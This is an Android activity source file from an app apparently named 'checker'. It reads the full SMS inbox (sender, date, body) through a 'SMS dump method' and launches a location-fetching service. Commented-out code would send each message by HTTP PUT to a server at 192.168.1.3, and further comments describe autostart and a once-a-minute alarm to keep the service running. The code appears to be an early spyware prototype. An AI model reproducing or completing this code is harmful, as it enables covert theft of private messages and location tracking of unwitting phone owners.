package com.app.checker;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    final int REQUEST_CODE_ASK_PERMISSIONS = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Temporary button to force test the service (makes one request per click)
        Button btnFetch= findViewById(R.id.btnTest);
        btnFetch.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
                } else {
                    Intent i = new Intent(getApplicationContext(), Fetcher.class);
                    startService(i);
                }
            }
        });

        // Temporary button to test the SMS dump method
        Button btnSms=findViewById(R.id.btnSms);
        btnSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);

                if(ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
                    ArrayList<String> sms = fetchInbox();

                    Toast.makeText(getApplicationContext(), String.valueOf(sms.size()), Toast.LENGTH_SHORT).show();
                    try {
                        //URL url = new URL("http://192.168.1.3/test.json");
                        //HttpURLConnection httpCon = (HttpURLConnection) url.openConnection();
                        //httpCon.setDoOutput(true);
                        //httpCon.setRequestMethod("PUT");
                        //OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());
                        for (int i = 0; i < sms.size(); i++) {
                      Toast.makeText(getApplicationContext(),sms.get(i),Toast.LENGTH_LONG).show();
                            //out.write(sms.get(i));
                        }
                        //out.close();
                        //httpCon.getInputStream();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });

        // Uncomment the following lines so you don't have to restart the device each time you want to test it
        // Unfortunately there is no way to trigger our Autostart() broadcast because of security measures from Android

        //Intent invokeService = new Intent(getApplicationContext(), Fetcher.class);
        //PendingIntent pintent = PendingIntent.getService(getApplicationContext(), 0, invokeService, 0);
        //AlarmManager alarm = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
        //alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),60000, pintent);

    }

    // Will be removed once the SMS dump module is fully tested
    public ArrayList<String> fetchInbox(){
        ArrayList<String> sms = new ArrayList<>();
        Uri uri = Uri.parse("content://sms/");
        Cursor cursor = getContentResolver().query(uri,new String[]{"_id","address","date","body"},"_id > 3",null,"date DESC");
        if(cursor != null) {
            cursor.moveToFirst();
            for(int i=0;i<cursor.getCount();i++){
                String address = cursor.getString(1);
                String date = cursor.getString(2);
                String body = cursor.getString(3);
                sms.add("Address=>"+address+"\n Date=>"+date+"\n Body=>"+body);
                cursor.moveToNext();
            }
        }
        return sms;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case 1:
                Intent i = new Intent(getApplicationContext(), Fetcher.class);
                startService(i);
                break;
        }
    }
}